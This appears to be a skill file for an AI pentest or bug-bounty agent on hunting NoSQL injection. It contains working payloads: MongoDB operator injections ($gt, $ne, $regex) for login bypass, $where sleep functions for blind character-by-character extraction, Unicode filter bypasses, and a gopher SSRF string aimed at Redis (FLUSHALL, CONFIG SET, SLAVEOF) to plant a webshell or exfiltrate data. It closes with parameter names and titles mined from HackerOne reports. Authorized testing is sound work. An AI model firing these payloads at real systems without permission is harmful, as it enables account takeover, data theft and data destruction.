---
name: hunt-nosqli
description: NoSQL injection hunting — MongoDB operator injection (auth bypass via $gt/$ne/$in/$regex), $where time-based blind ladder, query-string array notation, Redis via gopher SSRF, Mongoose populate $where (CVE-2024-53900), Rocket.Chat-style token brute via $regex, Unicode $ obfuscation. Use when Node/Express app with JSON bodies or Mongo/Mongoose/Redis detected. Trigger keywords: NoSQLi, Mongo injection, $where, operator injection, Redis injection.
---

# NoSQL Injection — Deep Hunting

## THE GATE
Node/Express + `application/json` bodies with nested objects → high-probability surface. Detect via `X-Powered-By: Express`, `mongoose`/`monk` in JS bundles, `param[]=value`.

## Auth Bypass Via Operator Injection (JSON bodies)
```json
{"username":{"$gt":""},"password":{"$gt":""}}
```
Returns the **first document in the collection** (usually admin) — `$gt:""` matches non-empty, so first-collection-entry selection matters. Variants: `$ne`, `$in:["admin","root"]`, `$regex:".*"`.

## Query-String / Array Notation
`username[$ne]=x&password[$ne]=x` works when `JSON.parse` rejects objects. Also `?username[$regex]=^a`.

## $where Time-Based Blind Ladder
1. Probe: `$where: "this.username && (new Date()-d) < 5000"` — 5s delay.
2. Conditional sleep exfil: `$where: "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"`.
3. Char-by-char via `$regex: "^$c"` with **response-length oracle** (paired true/false controls, never absolute byte-count).

## Redis Via SSRF (gopher)
```
gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0a...  (FLUSHALL / CONFIG SET / SLAVEOF → webshell or exfil)
```

## Bypasses
`$` sanitized → Unicode `$\u0067t` or nested deeper objects; URL param arrays when JSON rejected; `$regex` + `$options=i` case-insensitive.

## Validation (Gate)
- Auth bypass = valid session token received.
- Dump = returned unauthorized documents.
- Blind = consistent >4s delay, repeated 3x; negative control required.

## Common Mistakes
Only testing form-encoded params on Node endpoints; stopping at "auth bypass" without chaining to admin; absolute response-length instead of paired true/false; missing that `$gt:""` picks first collection entry.

## PARAMETER COVERAGE — operator injection on EVERY value (MANDATORY)
The #1 miss: testing only the username/password fields and skipping every other
JSON key. NoSQLi lives in ANY value the backend filters on — IDs, arrays, query
filters, sort keys, nested objects.

1. **Enumerate** every JSON key recursively (nested objects/arrays), every
   query-string key, every path segment, and header values that reach Mongo.
2. **For EACH value run the operator ladder**, one field per request:
   - `{"field":{"$gt":""}}`, `{"field":{"$ne":null}}`, `{"field":{"$in":["x"]}}`
   - `{"field":{"$regex":".*"}}`, `{"field":{"$regex":"^<char>","$options":"i"}}`
   - `$where` time-based: `"function(){if(this.field.match(/^a/)){sleep(3000);}return true;}"`
   - query-string array form: `field[$ne]=x`, `field[$regex]=^a`
3. **Auth-bypass shape**: swap the WHOLE login object — `{"username":{"$gt":""},"password":{"$gt":""}}` — and also test only ONE field as an operator while the other stays a literal.
4. **Blind char-exfil** uses paired true/false oracle controls (never absolute byte-count), re-verified per round.
5. **Re-sweep per context**: form vs JSON encoding, logged-in vs anonymous, and on EVERY collection-facing endpoint (search, filter, sort, invite, export, admin lists).
6. **WAF/parser block → bypass ladder** (Unicode `$`, nesting deeper, array notation), never drop the parameter.
7. **Track**: `endpoint → field → operator → result` in the journal; unlogged field = gap.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: nosql — 18 disclosed H1 reports (12 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `branch`
- `name`
- `id`
- `userEmail`
- `userPassword`
- `frm_userPassword_confirm`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] [meemo-app] Denial of Service via LDAP Injection** (LDAP Injection)
  - Signal: I would like to report `Denial of service via LDAP Injection` vulnerability in `meemo-app` module. It allows a malicious attacker to send a crafted input that is interpreted as an 
- **[critical] SQL Injection or Denial of Service due to a Prototype Pollution** (SQL Injection)
  - Signal: I would like to report a prototype pollution vulnerability in the `typeorm` package. It allows an attacker that is able to save a specially crafted object to pollute the `Object` p
- **[critical] Pre-Auth Blind NoSQL Injection leading to Remote Code Execution** (None)
  - Signal: **Summary:** The `getPasswordPolicy` method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over accounts by leak
- **[critical] Silent omission of certificate hostname verification in LibreSSL and BoringSSL** (Improper Certificate Validation)
  - Signal: ## Abstract LibreSSL and BoringSSL implemented ``X509_VERIFY_PARAM_set1_host`` differently than OpenSSL. All applications that use the preferred and documented way to configure a T

